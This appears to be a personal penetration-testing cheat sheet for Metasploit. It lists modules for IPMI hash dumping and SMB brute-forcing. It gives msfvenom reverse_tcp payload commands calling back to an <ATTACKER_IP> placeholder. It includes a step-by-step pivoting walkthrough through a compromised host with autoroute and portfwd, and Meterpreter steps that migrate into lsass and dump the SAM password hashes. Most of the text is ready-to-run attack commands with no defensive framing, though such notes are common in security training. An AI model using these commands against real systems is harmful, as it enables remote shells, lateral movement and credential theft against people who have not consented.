---
type: tool
category: exploitation
tags:
  - tool
---
# Overview

## Auxiliary
### IPMI
Retrieve IPMI hashes:
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
```
^0c38f9

### SMB
Fingerprinting the SMB-Version: ^f06847
```bash
use auxiliary/scanner/smb/smb_version
```

^391c96

^eb05ba
#### Bruteforcing
```bash
use auxiliary/scanner/smb/smb_login
```

^cbccf3


## Important Commands
### General
Commands:
	`help` = lists available commands 
	`info` = shows additional information for module
	`setg` = sets parameter (e.g. RHOSTS) globally, it is set until the program is restarted
	`show targets` = shows which versions/systems are vulnerable to the selected exploit
	`grep windows show payloads` lists all payloads and filters them for "windows"
	`set SESSION` = sets already existing session for e.g PrivEsc
	`search local exploit suggester` = scans chosen session for additional exploits such as PrivEsc

### Payloads
Lists all available payloads, especially useful in combination with `grep`:
```bash
msfvenom -l payloads
```
#### Start listener only - Multi/Handler
`Multi/Handler` is a listener like `nc -lvnp` but with many additional advantages. Such as encryption, access to entire `meterpreter` suite and additional MSF-features.
1. select module
```bash
use multi/handler
```
2. Set parameters such as LHOST & LPORT

### Pivoting 

#### Full Pivoting Example with Reverse Shell (Metasploit)
`Compromised Host` is required!
1.  Create the `reverse shell` payload for the compromised Host (linux):
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell
```
2. Setup listener in `metasploit` for the upcoming connection
```bash
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```
3. Upload the file to the compromised Host and execute it / establish connection with the `metasploit listener`
4. Background session
```shell
background
```


5. Creating reverse shell payload with `msfvenom` (in this case for windows:)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LINUX_PVIOT_IP> LPORT=7777 -f exe -o payload.exe
```
6. Setup listener in `metasploit`  for the upcoming connection
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 7777
run -j
```
7. Add route for the previously established `linux meterpreter session`:
```bash
use post/multi/manage/autoroute
set SESSION 1
run
```

8. Configure `portforwarding` for the `reverse Shell session`on the "middle man" (linux) over the `meterpreter session`:
switch to back grounded session:
```bash
sessions -i 1
```
Add `portforwarding` over `meterpreter`:
```bash
portfwd add -R -L 0.0.0.0 -l 7777 -p 7777 -r <ATTACKER_IP>
```
9. Configure `portforwarding` (in this case RDP) with `meterpreter` to be able to connect or exploit the target :
```bash
portfwd add -l 3389 -p 3389 -r <WINDOWS_IP>
```
10. Upload `reverse shell` to target (in this example via rdp):
```bash
xfreerdp /v:127.0.0.1 /u:victor /p:pass@123
```
## Meterpreter
Example of settings, usually only `LHOST` and `LPORT` are needed:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260901085919.png)
### Meterpreter Commands
There are many needed commands in order to navigate and use the `Meterpreter SHELL` properly:
	`help` = list all available commands
	`download FILENAME` = download file to local machine
	`search -f FILENAME` = search for file
	`cat` = shows content of a file
	`bg` = background session
	`hashdump` = dumps all local hashes 
	`lsa_dump_sam` = dumps SAM-DB
	
### Windows
#### Dump SAM-Hash table
1. find  `lsass.exe` PID ....
```bash
ps | grep -i lsass
```
2. ... and start a new thread (in the targetprocess lsass.exe) over the windows API-function `OpenProcess` and copy payload to it in order to gain the rights to dump the hash-table...
```bash
migrate <PID>
```
3. dump hashes:
```bash
hashdump
```